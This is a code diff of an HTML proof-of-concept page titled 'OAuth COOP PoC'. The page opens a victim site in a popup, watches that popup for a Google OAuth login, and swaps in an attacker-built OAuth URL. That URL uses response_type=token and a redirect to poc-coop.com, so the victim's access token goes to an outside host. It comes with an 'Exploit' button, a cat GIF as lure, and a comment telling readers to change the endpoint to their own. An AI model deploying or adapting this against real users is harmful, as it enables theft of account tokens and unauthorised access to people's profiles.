@@ -1,84 +1,120 @@
-
 <!DOCTYPE html>
 <html>
 <head>
+    <title>OAuth COOP PoC</title>
     <style>
         body {
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
             background-color: #f2f2f2;
+            font-family: Arial, sans-serif;
+            padding: 20px;
         }
         img {
-            width: 400px;
-            height: 500px;
+            width: 300px;
+            height: auto;
             object-fit: contain;
         }
         button {
             padding: 10px 20px;
+            margin-top: 20px;
             background-color: #4caf50;
             color: white;
             border: none;
             cursor: pointer;
+            font-size: 16px;
+        }
+        #log {
+            margin-top: 20px;
+            background: #000;
+            color: #0f0;
+            padding: 10px;
+            font-family: monospace;
+            height: 200px;
+            width: 90%;
+            max-width: 600px;
+            overflow-y: auto;
+            text-align: left;
         }
     </style>
-<script>
-    function getParameterByName(name, url) {
-        if (!url) url = window.location.href;
-        name = name.replace(/[\[\]]/g, "\\$&");
-        var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
-            results = regex.exec(url);
-        if (!results) return null;
-        if (!results[2]) return '';
-        return decodeURIComponent(results[2].replace(/\+/g, " "));
-    }
-
-    let foo;
-    let initialFrames = 0;
-    var urlParam = getParameterByName('url');
-    let attackOAuthURL = "https://accounts.google.com/o/oauth2/v2/auth?client_id=50787447880-lej9pu0gkn41t1cacqcisjessmcrt9bf.apps.googleusercontent.com&redirect_uri=https://poc-coop.com/store.html&response_type=token&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.profile";
-
-    function init() {
-        try {
-            initialFrames = foo.frames.length; // Get initial frame count
-            console.log("Initial Frame Count: " + initialFrames);
-            monitorFrames();
-        } catch (e) {
-            console.log("Error accessing frame count.");
-        }
-    }
-
-    function monitorFrames() {
-        if (!foo || foo.closed) {
-            console.log("Login window closed, stopping attack.");
-            return;
+    <script>
+        // Helper: parse URL params
+        function getParameterByName(name, url) {
+            if (!url) url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
         }
 
-        try {
-            let currentFrames = foo.frames.length;
+        // Logger
+        function log(msg) {
+            document.getElementById("log").innerHTML += msg + "<br>";
+        }
 
-            if (currentFrames > initialFrames) {
-                console.log("OAuth login detected! Redirecting...");
-                foo.location.replace(attackOAuthURL);
+        let foo;
+        let urlParam;
+        let attackOAuthURL;
+
+        // Build attack OAuth URL dynamically
+        function buildAttackURL() {
+            let client_id = "50787447880-lej9pu0gkn41t1cacqcisjessmcrt9bf.apps.googleusercontent.com";
+            let redirect_uri = "https://poc-coop.com/store.html"; // change to your endpoint
+            let scope = "https://www.googleapis.com/auth/userinfo.profile";
+
+            return "https://accounts.google.com/o/oauth2/v2/auth?" +
+                "client_id=" + encodeURIComponent(client_id) +
+                "&redirect_uri=" + encodeURIComponent(redirect_uri) +
+                "&response_type=token" +
+                "&scope=" + encodeURIComponent(scope);
+        }
+
+        function monitorNavigation() {
+            if (!foo || foo.closed) {
+                log("▶ Target window closed. Stopping monitor.");
                 return;
             }
-        } catch (e) {
-            console.log("Monitoring frames...");
+
+            try {
+                let loc = foo.location.href;
+                log("Monitoring: " + loc);
+
+                // Detect Google OAuth navigation
+                if (loc.includes("accounts.google.com")) {
+                    log("⚠ Detected Google OAuth flow, injecting malicious redirect...");
+                    foo.location.replace(attackOAuthURL);
+                    return;
+                }
+            } catch (e) {
+                // Cross-origin block until same-origin or navigated
+                log("Cross-origin navigation detected, waiting...");
+            }
+
+            setTimeout(monitorNavigation, 800);
         }
 
-        setTimeout(monitorFrames, 1000); // Keep monitoring every second
-    }
+        function launch() {
+            attackOAuthURL = buildAttackURL();
+            urlParam = getParameterByName('url');
+            if (!urlParam) {
+                log("❌ Missing ?url= parameter for victim flow.");
+                return;
+            }
 
-    function launch() {
-        foo = window.open(urlParam, "foo", "");
-        setTimeout(init, 2000); // Start monitoring after 2 seconds
-    }
-</script>
+            log("▶ Opening target: " + urlParam);
+            foo = window.open(urlParam, "foo", "width=500,height=600,noopener,noreferrer");
+
+            setTimeout(monitorNavigation, 2000); // start monitoring
+        }
+    </script>
 </head>
 <body>
-    <script src="/main.js"></script>
-    <img src="https://media.tenor.com/HQEVMrJMMI0AAAAi/cat-cat-tutu.gif">
-    </br>
+    <img src="https://media.tenor.com/HQEVMrJMMI0AAAAi/cat-cat-tutu.gif" alt="Funny cat">
     <button onclick="launch()">Exploit</button>
+    <div id="log"></div>
 </body>
 </html>
